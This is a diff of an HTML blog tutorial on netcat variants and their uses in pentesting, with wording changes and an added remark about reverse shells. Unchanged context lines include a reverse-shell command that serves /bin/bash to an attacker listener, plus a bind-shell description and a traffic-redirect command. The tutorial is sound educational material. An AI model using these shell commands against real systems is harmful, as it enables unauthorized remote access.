@@ -3,9 +3,10 @@
 &lt;p>Netcat is a tool that reads and writes data across network connections, using TCP or UDP protocol. Netcat has been referred to as the TCP/IP / networking swiss army knife.
 In this article we&amp;rsquo;ll look at different applications of netcat and how it can be useful in day to day activities of a pentester, security professional, sysadmin etc&amp;hellip;&lt;/p>
 &lt;p>If you would like to test out these commands in a lab environment without the need to install them on your own machine have a look at my scenario on &lt;a href="https://app.cyberranges.com" target="_blank" rel="noopener">&lt;strong>CYBERRANGES&lt;/strong>&lt;/a>
-using this
-link.&lt;/p>
-&lt;p>&lt;a href="https://app.cyberranges.com/scenario/60e782766596fe0006aeceb8">https://app.cyberranges.com/scenario/60e782766596fe0006aeceb8&lt;/a>&lt;/p>
+using the
+link below.&lt;/p>
+&lt;p>&lt;a href="https://app.cyberranges.com/scenario/60e782766596fe0006aeceb8" target="_blank" rel="noopener">Netcat Scenario&lt;/a>
+&lt;/p>
 &lt;h2 id="variants">Variants&lt;/h2>
 &lt;p>There are several variants of netcat but most of the core functionality and command line options are very similar. Netcat having being initially written to be used on linux
 the variants are linux based but you can still have netcat on windows.&lt;/p>
@@ -18,7 +19,7 @@ longer maintained and is on version 1.10.&lt;/p>
 &lt;p>If you the different variants of netcat on your system you may have to invoke the command with the full binary name. In this case we&amp;rsquo;ll run &lt;code>nc.traditional -h&lt;/code> to see the command line
 options.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/netcat/netcat-4.png" class="center" style="border-radius: 8px;" />
-&lt;p>You notice the -e and -c options which are not available in the openbsd version. This is the feature that is considered a security hole. More on this when we get to the shells section.&lt;/p>
+&lt;p>You notice the -e option, this is not available in the openbsd version. This is the feature that is considered a security hole. More on this when we get to the shells section.&lt;/p>
 &lt;h3 id="gnu-netcat">GNU Netcat&lt;/h3>
 &lt;p>GNU Netcat is a rewrite of the original netcat to make it more portable with new features and fully GNU compliant. This means it can be easily installed on almost all linux distros.
 This version is not available via package manager. It seems to also be no longer maintained as it&amp;rsquo;s latest version is 0.7.1 from 2004.&lt;/p>
@@ -83,7 +84,9 @@ the attacker machine and the client the victim machine.&lt;/p>
 &lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">nc -lvnp &lt;span style="color:#ae81ff">8080&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>Client (victim machine)&lt;/p>
 &lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">nc -e /bin/bash 192.168.125.10 &lt;span style="color:#ae81ff">8080&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>Bind shells&lt;/strong>&lt;/p>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Something to note is that, just because the openbsd version does not have this -e option, does not mean that it is impossible to get a reverse
+shell when it&amp;rsquo;s installed. There are still ways it can be used to achieve a reverse shell.&lt;/p>
+&lt;p>&lt;strong>Bind shells&lt;/strong>&lt;/p>
 &lt;p>For a bind shell, netcat in server mode listens for a connection and serves the shell process to any connecting client. Netcat running in
 client mode can then connect to the server and get shell access to the server and run commands. From a pentesting perspective the server
 would be the victim machine and the client the attacker machine.&lt;/p>
@@ -116,7 +119,7 @@ they have a better tool for that, which would be nmap.&lt;/p>
 &lt;/code>&lt;/pre>&lt;p>To redirect traffic from server1 to a web app running on server3 (192.168.125.40) on port 8080 we can execute the below ncat command on server2.&lt;/p>
 &lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">nc -klvnp &lt;span style="color:#ae81ff">8000&lt;/span> -e &lt;span style="color:#e6db74">&amp;#34;/bin/nc 192.168.125.40 8080&amp;#34;&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>Now you can reach the web app on server3 by accessing server2 on port 8000.&lt;/p>
-&lt;h3 id="ncat-extras">Ncat Extras&lt;/h3>
+&lt;h3 id="ncat-additional-features">Ncat Additional Features&lt;/h3>
 &lt;p>From the features the security risks can be seen because there&amp;rsquo;s no encryption on the connection as netcat will write to the connection in its
 rawest form, therefore anyone sniffing the network can capture all your traffic unencrypted in the case of shells and file transfer. For bind shells,
 there&amp;rsquo;s no authentication therefore anyone connecting to the port the bind shell is listening on will be able to run commands on the machine.&lt;/p>
